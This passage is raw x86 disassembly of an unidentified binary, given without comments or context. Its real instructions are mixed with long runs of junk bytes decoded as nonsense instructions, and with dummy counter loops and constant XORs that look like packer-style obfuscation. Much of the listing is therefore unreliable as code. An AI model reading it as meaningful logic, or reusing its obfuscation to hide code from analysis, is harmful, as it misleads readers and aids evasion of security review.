  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fde9,0x42fdd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fde9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x3cc7d044]
  40e122:	repnz cmp eax,0x7070a668
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0e7
  40e12d:	dec    ebx
  40e12e:	xlat   BYTE PTR ds:[ebx]
  40e12f:	and    eax,0xede61ae8
  40e134:	mov    ebp,0xbf45eae7
  40e139:	sbb    esi,DWORD PTR ds:0x43aa6ca7
  40e13f:	xchg   ebx,eax
  40e140:	mov    ah,0xe0
  40e142:	loop   0x40e173
  40e144:	xor    eax,0x4a062a81
  40e149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14a:	sub    eax,0x4472cfc6
  40e14f:	add    ebx,DWORD PTR [eax+0x1799195a]
  40e155:	push   0x3f
  40e157:	into   
  40e158:	xchg   esi,eax
  40e159:	dec    ebx
  40e15a:	xor    DWORD PTR [edx-0x4a],0x7b
  40e15e:	scas   eax,DWORD PTR es:[edi]
  40e15f:	call   0x68252584
  40e164:	pushf  
  40e165:	test   edx,esi
  40e167:	mov    bh,0x9d
  40e169:	push   gs
  40e16b:	push   ebp
  40e16c:	lods   al,BYTE PTR ds:[esi]
  40e16d:	fisub  DWORD PTR [esi]
  40e16f:	gs loop 0x40e10a
  40e172:	cmp    BYTE PTR es:[ebx],0x7a
  40e176:	cwde   
  40e177:	out    dx,eax
  40e178:	jnp    0x40e194
  40e17a:	sub    DWORD PTR [edi-0x79],ebp
  40e17d:	iret   
  40e17e:	adc    DWORD PTR [esi+ebp*2-0x777a3e58],edx
  40e185:	adc    al,0x6
  40e187:	idiv   DWORD PTR [eax-0x3047035e]
  40e18d:	sbb    eax,0x29a5a4c9
  40e192:	outs   dx,DWORD PTR ds:[esi]
  40e193:	push   esi
  40e194:	push   0x1884c991
  40e199:	in     eax,dx
  40e19a:	xchg   ecx,eax
  40e19b:	test   DWORD PTR [esp+edx*1],ebp
  40e19e:	sub    BYTE PTR [esi],cl
  40e1a0:	add    eax,0xeff8d54c
  40e1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a6:	ror    BYTE PTR [ebx+0x7b],0xd6
  40e1aa:	adc    eax,DWORD PTR [ecx+0x5227ee4]
  40e1b0:	aaa    
  40e1b1:	sub    esp,DWORD PTR [edi+ecx*4-0x69e6f507]
  40e1b8:	jbe    0x40e18b
  40e1ba:	inc    esi
  40e1bb:	sub    BYTE PTR [ebp+0x78ef8e4c],0x53
  40e1c2:	loopne 0x40e1fb
  40e1c4:	outs   dx,BYTE PTR ds:[esi]
  40e1c5:	outs   dx,DWORD PTR ds:[esi]
  40e1c6:	xor    BYTE PTR [edi-0x1e],al
  40e1c9:	or     BYTE PTR [ebx],0xe7
  40e1cc:	pop    esi
  40e1cd:	dec    ebx
  40e1ce:	(bad)  
  40e1cf:	jecxz  0x40e1ed
  40e1d1:	add    DWORD PTR [eax],esp
  40e1d3:	mov    dh,BYTE PTR [esp+edx*2-0x149309c3]
  40e1da:	icebp  
  40e1db:	xchg   esp,eax
  40e1dc:	nop    DWORD PTR [ebx-0x771631fa]
  40e1e3:	jne    0x40e1b6
  40e1e5:	cmp    eax,0x57caad7e
  40e1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1eb:	pop    ds
  40e1ec:	aas    
  40e1ed:	test   al,0x24
  40e1ef:	into   
  40e1f0:	addr16 xchg ebx,eax
  40e1f2:	ja     0x40e1d2
  40e1f4:	call   DWORD PTR [edx]
  40e1f6:	aam    0xac
  40e1f8:	out    dx,eax
  40e1f9:	cmp    al,0xb1
  40e1fb:	pop    ecx
  40e1fc:	lods   al,BYTE PTR ds:[esi]
  40e1fd:	jnp    0x40e20d
  40e1ff:	push   ds
  40e200:	cli    
  40e201:	stos   BYTE PTR es:[edi],al
  40e202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e203:	lods   eax,DWORD PTR ds:[esi]
  40e204:	pop    ebx
  40e205:	loop   0x40e19e
  40e207:	(bad)  
  40e208:	(bad)  
  40e209:	jp     0x40e1d4
  40e20b:	xlat   BYTE PTR ds:[ebx]
  40e20c:	fs mov ah,0xa6
  40e20f:	xor    al,0xe2
  40e211:	cmp    al,0x34
  40e213:	cs fs dec ebx
  40e216:	test   al,0x4f
  40e218:	lods   eax,DWORD PTR ds:[esi]
  40e219:	mov    eax,0xc31e4194
  40e21e:	mov    ds:0x4d72f0ce,eax
  40e223:	stos   BYTE PTR es:[edi],al
  40e224:	retf   
  40e225:	and    ecx,0xffffffb6
  40e228:	aam    0xfb
  40e22a:	pop    ebx
  40e22b:	mov    ds:0x30928b5d,eax
  40e230:	sub    eax,0x150357b6
  40e235:	cmc    
  40e236:	adc    dl,cl
  40e238:	test   ah,al
  40e23a:	xchg   ah,ch
  40e23c:	(bad)  
  40e23e:	rcl    edi,1
  40e240:	and    dh,BYTE PTR [esi-0x63b41a63]
  40e246:	aaa    
  40e247:	jne    0x40e25a
  40e249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e24a:	pop    eax
  40e24b:	popa   
  40e24c:	pop    ss
  40e24d:	test   al,0x4c
  40e24f:	ror    BYTE PTR [ebp+0x69],cl
  40e252:	pop    es
  40e253:	xor    DWORD PTR [esi],0x9df96a65
  40e259:	mov    DWORD PTR [eax+0x7d],ecx
  40e25c:	cwde   
  40e25d:	outs   dx,BYTE PTR ds:[esi]
  40e25e:	fild   WORD PTR [esi]
  40e260:	mov    bh,0x6e
  40e262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e263:	mov    ebp,0x890a9a59
  40e268:	iret   
  40e269:	daa    
  40e26a:	xchg   ebp,eax
  40e26b:	xchg   esi,eax
  40e26c:	js     0x40e2bc
  40e26e:	jmp    0x40e2ec
  40e270:	out    dx,al
  40e271:	or     ecx,eax
  40e273:	out    dx,eax
  40e274:	mov    dh,0x70
  40e276:	iret   
  40e277:	in     eax,dx
  40e278:	loope  0x40e203
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	std    
  40e281:	std    
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fdfd0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fdfd
  40e295:	cmp    DWORD PTR ds:0x42fdfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e663
  40e2b0:	cmp    DWORD PTR ds:0x42fdfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fdfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fe6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fe6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fe6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fe01
  40e315:	call   DWORD PTR ds:0x42e577
  40e31b:	cmp    DWORD PTR ds:0x42fe6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e894
  40e340:	mov    ecx,DWORD PTR ds:0x42e89c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fe72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	enter  0x9e3b,0x1d
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3bc
  40e383:	in     al,dx
  40e384:	sub    al,0xf5
  40e386:	lods   eax,DWORD PTR ds:[esi]
  40e387:	ret    
  40e388:	sub    eax,0x8583b689
  40e38d:	in     al,0x21
  40e38f:	ins    DWORD PTR es:[edi],dx
  40e390:	ins    BYTE PTR es:[edi],dx
  40e391:	dec    ecx
  40e392:	popa   
  40e393:	lods   eax,DWORD PTR ss:[esi]
  40e395:	adc    al,dh
  40e397:	leave  
  40e398:	jmp    0x40e3d9
  40e39a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e39b:	lods   al,BYTE PTR ds:[esi]
  40e39c:	enter  0x395a,0x3d
  40e3a0:	(bad)  [edx+eiz*2]
  40e3a3:	(bad)  
  40e3a4:	rol    esp,1
  40e3a6:	addr16 jns 0x40e3c6
  40e3a9:	pushf  
  40e3aa:	(bad)  
  40e3ab:	fcom   QWORD PTR [ecx+0x4a]
  40e3ae:	adc    ecx,esp
  40e3b0:	repz in al,dx
  40e3b2:	repnz in al,0x8d
  40e3b5:	xor    dh,0xf6
  40e3b8:	inc    esi
  40e3b9:	pand   mm7,QWORD PTR [eax+0x4754503f]
  40e3c0:	push   0xfffffff8
  40e3c2:	paddd  mm3,QWORD PTR cs:[bx+si-0x31]
  40e3c8:	cmp    eax,0x44ec43f5
  40e3cd:	and    DWORD PTR [esi],esi
  40e3cf:	ds sbb al,0xea
  40e3d2:	mov    ah,0xc2
  40e3d4:	push   cs
  40e3d5:	push   edx
  40e3d6:	mov    al,es:0xfbd55380
  40e3dc:	test   BYTE PTR [esi+edx*1],0x89
  40e3e0:	lds    edi,FWORD PTR ds:0xd629dc70
  40e3e7:	jl     0x40e454
  40e3e9:	mov    al,BYTE PTR [ebx-0x1a]
  40e3ec:	push   es
  40e3ed:	and    al,0x35
  40e3ef:	xor    DWORD PTR [edi-0x8],eax
  40e3f2:	das    
  40e3f3:	pop    eax
  40e3f4:	mov    al,BYTE PTR [ebp-0x7]
  40e3f7:	jge    0x40e447
  40e3f9:	sbb    bl,cl
  40e3fb:	scas   al,BYTE PTR es:[edi]
  40e3fc:	or     DWORD PTR [edx],esp
  40e3fe:	pop    ebp
  40e3ff:	scas   al,BYTE PTR es:[edi]
  40e400:	imul   ecx,DWORD PTR [esp],0x5
  40e404:	ror    BYTE PTR [ebx+0x4e],cl
  40e407:	mov    bl,0x50
  40e409:	push   ss
  40e40a:	or     BYTE PTR [eax],0x72
  40e40d:	(bad)  
  40e40e:	push   esp
  40e40f:	mov    BYTE PTR [ebx],ah
  40e411:	jb     0x40e439
  40e413:	pushf  
  40e414:	inc    ebp
  40e415:	fimul  DWORD PTR [esp+eax*1-0x1e0a7d5]
  40e41c:	push   ebp
  40e41d:	xchg   BYTE PTR [ebx],bl
  40e41f:	fild   WORD PTR [ecx]
  40e421:	ja     0x40e47d
  40e423:	sbb    DWORD PTR [esi-0x2825f8ea],eax
  40e429:	push   ds
  40e42a:	and    al,0x48
  40e42c:	xor    eax,DWORD PTR [esi]
  40e42e:	inc    eax
  40e42f:	mov    ecx,0x3cdccf44
  40e434:	call   0xb8ec8a6b
  40e439:	repz pop ss
  40e43b:	jl     0x40e495
  40e43d:	mov    bh,0x91
  40e43f:	jecxz  0x40e482
  40e441:	mov    ecx,0xdaba5c1d
  40e446:	adc    ch,cl
  40e448:	mov    al,0xde
  40e44a:	in     al,0xcd
  40e44c:	shl    BYTE PTR [eax-0x4e],cl
  40e44f:	push   esi
  40e450:	jnp    0x40e480
  40e452:	push   edx
  40e453:	jno    0x40e3e2
  40e455:	test   DWORD PTR [edi],esi
  40e457:	inc    edx
  40e458:	js     0x40e3df
  40e45a:	mov    ebx,ds
  40e45c:	cld    
  40e45d:	ror    BYTE PTR [edx+0x36],0x7
  40e461:	shl    BYTE PTR fs:[edi+0x25],1
  40e465:	and    DWORD PTR [ebx-0x6912e5e8],esi
  40e46b:	ror    BYTE PTR [edi-0x4a],1
  40e46e:	fwait
  40e46f:	dec    edx
  40e470:	not    esi
  40e472:	imul   edi,esp,0x47
  40e475:	popa   
  40e476:	cdq    
  40e477:	sub    al,bh
  40e479:	leave  
  40e47a:	ds xchg ebx,eax
  40e47c:	iret   
  40e47d:	dec    esi
  40e47e:	mov    eax,0x71a42ddb
  40e483:	inc    ebx
  40e484:	fidiv  WORD PTR [eax-0x1d]
  40e487:	push   esi
  40e488:	jne    0x40e494
  40e48a:	push   ebx
  40e48b:	jbe    0x40e422
  40e48d:	mov    WORD PTR [edx-0x17],?
  40e490:	pusha  
  40e491:	inc    esp
  40e492:	mov    eax,ds:0xc919eada
  40e497:	cld    
  40e498:	rol    DWORD PTR [ebx-0x30],1
  40e49b:	hlt    
  40e49c:	and    al,0xde
  40e49e:	psadbw mm4,mm3
  40e4a1:	dec    ebx
  40e4a2:	icebp  
  40e4a3:	push   edi
  40e4a4:	inc    eax
  40e4a5:	stos   BYTE PTR es:[edi],al
  40e4a6:	js     0x40e47b
  40e4a8:	or     edx,ebx
  40e4aa:	add    edi,DWORD PTR [edx+0x659245bf]
  40e4b0:	mov    cl,0x41
  40e4b2:	int    0x10
  40e4b4:	aaa    
  40e4b5:	dec    eax
  40e4b6:	pmuludq mm6,QWORD PTR [ebp+esi*1-0x4f]
  40e4bb:	pop    edx
  40e4bc:	and    eax,0x6624da32
  40e4c1:	leave  
  40e4c2:	mov    ah,0xd9
  40e4c4:	dec    esp
  40e4c5:	call   0xf8dc:0x7b2e33a1
  40e4cc:	test   al,0x25
  40e4ce:	scas   eax,DWORD PTR es:[edi]
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x1a0f740f
  40e4f5:	adc    eax,DWORD PTR [esi-0x72]
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	or     DWORD PTR [ebx+0x30d2751],eax
  40e505:	jne    0x40e542
  40e507:	in     al,0xb9
  40e509:	test   esp,edx
  40e50b:	test   al,0x25
  40e50d:	push   esi
  40e50e:	sub    al,0x2b
  40e510:	pop    ss
  40e511:	sub    eax,0x172b3b27
  40e516:	ja     0x40e507
  40e518:	dec    eax
  40e519:	and    dh,0x11
  40e51c:	xor    esp,DWORD PTR [esi]
  40e51e:	rcl    dh,cl
  40e520:	push   ebp
  40e521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e522:	std    
  40e523:	dec    esp
  40e524:	fcmovnbe st,st(3)
  40e526:	mov    ds:0x622694fa,eax
  40e52b:	jo     0x40e542
  40e52d:	(bad)  [eax-0x27]
  40e530:	gs xchg edi,eax
  40e532:	push   eax
  40e533:	push   cs
  40e534:	jbe    0x40e4ef
  40e536:	mov    WORD PTR [eax*2-0x4d15a935],?
  40e53d:	lds    eax,FWORD PTR [ebx+0x4b]
  40e540:	nop
  40e541:	int    0x3e
  40e543:	push   ebx
  40e544:	mov    ?,ebp
  40e546:	into   
  40e547:	xchg   DWORD PTR [ecx+0xe877f14],eax
  40e54d:	xchg   BYTE PTR [edi-0x9],dl
  40e550:	cdq    
  40e551:	sub    BYTE PTR [esi-0x44],ah
  40e554:	xor    eax,0x720aee09
  40e559:	jge    0x40e5c2
  40e55b:	aas    
  40e55c:	and    al,0x2
  40e55e:	pop    ss
  40e55f:	mov    edi,0xf8bcb52f
  40e564:	test   DWORD PTR [ebx],edi
  40e566:	dec    ecx
  40e567:	jo     0x40e552
  40e569:	mov    eax,ds:0xe81f0343
  40e56e:	dec    edi
  40e56f:	les    ecx,FWORD PTR [edx+0x37e3a198]
  40e575:	fwait
  40e576:	popf   
  40e577:	mov    ah,ah
  40e579:	icebp  
  40e57a:	stc    
  40e57b:	pop    es
  40e57c:	xor    BYTE PTR [edx+edx*2-0x2eb56d43],bh
  40e583:	js     0x40e558
  40e585:	add    eax,0x5b59d002
  40e58a:	imul   esi,DWORD PTR [ebp-0x4ea0c772],0x3c2c364e
  40e594:	leave  
  40e595:	(bad)  
  40e596:	cs inc edx
  40e598:	cli    
  40e599:	dec    edi
  40e59a:	jge    0x40e5e4
  40e59c:	mov    eax,0x1bfeff36
  40e5a1:	lds    ebp,FWORD PTR [edi-0x71a0db4]
  40e5a7:	push   ebx
  40e5a8:	jb     0x40e56d
  40e5aa:	push   edx
  40e5ab:	and    eax,0xfb03004d
  40e5b0:	jno    0x40e592
  40e5b2:	sub    eax,0xd76e86aa
  40e5b7:	push   0x553cb5f8
  40e5bc:	adc    ecx,DWORD PTR [esi]
  40e5be:	push   esp
  40e5bf:	ins    BYTE PTR es:[edi],dx
  40e5c0:	mov    eax,ds:0xfdc8ff18
  40e5c5:	xor    DWORD PTR [esi-0x12e8cff1],ebx
  40e5cb:	out    0x16,eax
  40e5cd:	adc    eax,0x9f7ff921
  40e5d2:	sub    eax,0x9412a154
  40e5d7:	dec    ebp
  40e5d8:	inc    esp
  40e5d9:	mov    eax,0x509f0711
  40e5de:	jle    0x40e5a1
  40e5e0:	pop    esp
  40e5e1:	repnz or dl,al
  40e5e4:	lock addr16 pop ebx
  40e5e7:	and    BYTE PTR [ebx+eiz*1],0x88
  40e5eb:	jnp    0x40e598
  40e5ed:	or     edx,DWORD PTR [ebx+0x11]
  40e5f0:	mov    ecx,0x1422d5ae
  40e5f5:	xlat   BYTE PTR ds:[ebx]
  40e5f6:	cwde   
  40e5f7:	cli    
  40e5f8:	lods   al,BYTE PTR ds:[esi]
  40e5f9:	imul   BYTE PTR [edi]
  40e5fb:	mov    ebp,0xb182e52b
  40e600:	sub    eax,0xbeb4c003
  40e605:	outs   dx,DWORD PTR ds:[esi]
  40e606:	or     DWORD PTR [eax+0x2a9a1060],0x6e
  40e60d:	(bad)  
  40e60f:	out    dx,eax
  40e610:	add    DWORD PTR [ebp-0x59],edx
  40e613:	arpl   WORD PTR [ecx-0x914292e],bx
  40e619:	lahf   
  40e61a:	fidivr WORD PTR [esi+edi*1-0x42]
  40e61e:	cmp    BYTE PTR [ecx-0x43],0x7e
  40e622:	xchg   ecx,ebp
  40e624:	jl     0x40e60d
  40e626:	inc    ebx
  40e627:	jne    0x40e67a
  40e629:	dec    eax
  40e62a:	xchg   ecx,eax
  40e62b:	cld    
  40e62c:	sbb    eax,edx
  40e62e:	and    eax,0x7177c611
  40e633:	sti    
  40e634:	pop    ebp
  40e635:	fidiv  DWORD PTR [edi*8+0x46c1c8c0]
  40e63c:	js     0x40e631
  40e63e:	gs popa 
  40e640:	jp     0x40e5cb
  40e642:	push   esi
  40e643:	iret   
  40e644:	xchg   edx,eax
  40e645:	xor    eax,0x2be41059
  40e64a:	fild   WORD PTR [ebx+ecx*4+0x2581e845]
  40e651:	jp     0x40e651
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fe7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fe7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fe7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fe7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e57b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e21c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fe01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fdd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	mov    edx,0x51f97298
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	and    esi,DWORD PTR [ebx+0x47]
  40e6e9:	adc    eax,0x20d37e4f
  40e6ee:	inc    esi
  40e6ef:	or     BYTE PTR [esi+0x38],dl
  40e6f2:	(bad)  
  40e6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6f4:	mov    dl,0xff
  40e6f6:	mov    eax,ds:0x73a7c01
  40e6fb:	and    DWORD PTR [eax+0x73e3484e],ecx
  40e701:	in     eax,0x78
  40e703:	mov    bh,0x38
  40e705:	and    BYTE PTR [ebp+0x69],0xa7
  40e709:	cdq    
  40e70a:	popa   
  40e70b:	repz cmp ebp,DWORD PTR [edi+0x42]
  40e70f:	sbb    DWORD PTR [edi],edi
  40e711:	in     eax,dx
  40e712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e713:	jge    0x40e69a
  40e715:	sub    al,0x67
  40e717:	mov    ds:0xbac8eeff,eax
  40e71c:	jns    0x40e6cb
  40e71e:	xchg   ebx,eax
  40e71f:	inc    ebp
  40e720:	sbb    eax,0xbb42a5e9
  40e725:	mov    ds:0x5bcff4aa,eax
  40e72a:	fmul   DWORD PTR [eax]
  40e72c:	adc    DWORD PTR [edi+0x7a656f14],eax
  40e732:	rcr    BYTE PTR [edx+eax*2],1
  40e735:	imul   ebx,DWORD PTR [esi-0x2a],0xfffffffe
  40e739:	and    eax,0xa399466f
  40e73e:	shr    DWORD PTR [ecx+0x71],cl
  40e741:	scas   eax,DWORD PTR es:[edi]
  40e742:	xor    esi,0xffffff91
  40e745:	bound  esp,QWORD PTR [edi]
  40e747:	adc    BYTE PTR [esi+0x1a],bh
  40e74a:	mov    ss,WORD PTR [edi+edx*8-0x12]
  40e74e:	mov    ds:0x2f48df25,eax
  40e753:	je     0x40e734
  40e755:	enter  0xc627,0x1e
  40e759:	lock xlat BYTE PTR ds:[ebx]
  40e75b:	mov    edi,DWORD PTR [ebx-0x77]
  40e75e:	mov    ebx,0x1b1f87ee
  40e763:	jb     0x40e75a
  40e765:	lea    edi,ss:0xa7a411c5
  40e76c:	stc    
  40e76d:	xchg   ebx,eax
  40e76e:	xchg   esi,eax
  40e76f:	push   ebx
  40e770:	mov    ah,0xa6
  40e772:	loopne 0x40e7d9
  40e774:	sahf   
  40e775:	jae    0x40e7dd
  40e777:	fnstsw WORD PTR [edi+0x54f16ae1]
  40e77d:	or     bl,BYTE PTR [ebx-0x373b7399]
  40e783:	inc    ebx
  40e784:	mov    edi,0x8024dc3f
  40e789:	retf   0x5336
  40e78c:	stos   BYTE PTR es:[edi],al
  40e78d:	adc    bl,BYTE PTR [edi]
  40e78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e790:	pushf  
  40e791:	mov    edi,0x395cec61
  40e796:	shl    BYTE PTR [ebx+0x1d],1
  40e799:	in     eax,dx
  40e79a:	cmp    BYTE PTR ds:0xff37f6a9,bh
  40e7a0:	sahf   
  40e7a1:	push   ss
  40e7a2:	add    BYTE PTR [ebx-0x5391be21],bh
  40e7a8:	shr    edx,1
  40e7aa:	retf   0x2ec2
  40e7ad:	jmp    0x40e748
  40e7af:	mov    bh,0x19
  40e7b1:	adc    bl,BYTE PTR [ebx-0x64]
  40e7b4:	inc    ecx
  40e7b5:	pop    es
  40e7b6:	ss in  al,dx
  40e7b8:	repnz add BYTE PTR [ebx],ah
  40e7bb:	sub    ch,BYTE PTR [ebp*2-0x18dba080]
  40e7c2:	sub    ah,BYTE PTR [ecx-0x3f]
  40e7c5:	adc    bh,BYTE PTR [edx]
  40e7c7:	add    ebp,DWORD PTR [esi]
  40e7c9:	scas   al,BYTE PTR es:[edi]
  40e7ca:	test   al,0x1a
  40e7cc:	mov    cl,0xb
  40e7ce:	adc    BYTE PTR [edi],bh
  40e7d0:	jns    0x40e785
  40e7d2:	in     al,0x78
  40e7d4:	push   esp
  40e7d5:	jmp    0x9258:0x8d481e89
  40e7dc:	clc    
  40e7dd:	stos   BYTE PTR es:[edi],al
  40e7de:	mov    ebp,0x6a14cdd0
  40e7e3:	pusha  
  40e7e4:	adc    ah,bh
  40e7e6:	xchg   edx,eax
  40e7e7:	jl     0x40e82a
  40e7e9:	call   0x19f1:0xab25f300
  40e7f0:	mov    ds:0xfd4526fa,al
  40e7f5:	sub    ch,BYTE PTR [eax-0x7f41c12d]
  40e7fb:	adc    bh,BYTE PTR [eax+0x7c]
  40e7fe:	mov    edi,DWORD PTR [ebx]
  40e800:	push   ds
  40e801:	lahf   
  40e802:	dec    esp
  40e803:	pop    esi
  40e804:	out    dx,eax
  40e805:	(bad)  
  40e806:	sbb    ebx,esp
  40e808:	test   al,0x49
  40e80a:	stc    
  40e80b:	and    bl,BYTE PTR [ecx+0x63]
  40e80e:	cmp    BYTE PTR [eax+ebx*4-0x4b12fffc],ch
  40e815:	nop
  40e816:	sub    ah,dl
  40e818:	sub    bl,BYTE PTR [edx+0x41e1d3ef]
  40e81e:	mov    DWORD PTR [esi],edx
  40e820:	xor    eax,DWORD PTR gs:[edx-0xe]
  40e824:	sbb    cx,WORD PTR [eax+0x2a69aa71]
  40e82b:	sti    
  40e82c:	and    al,0x60
  40e82e:	rcr    BYTE PTR [ecx-0x24],0x8e
  40e832:	sbb    DWORD PTR [ebx-0x16ea7f00],ecx
  40e838:	std    
  40e839:	inc    edx
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fe0d,0x42fe7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fde1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e21c,0x42e7ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e80b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fdd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fdd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fdd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fdd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e2e7
  40e8ca:	call   DWORD PTR ds:0x42e57f
  40e8d0:	cmp    DWORD PTR ds:0x42fdd1,0x7
  40e8d7:	jne    0x40e8ec
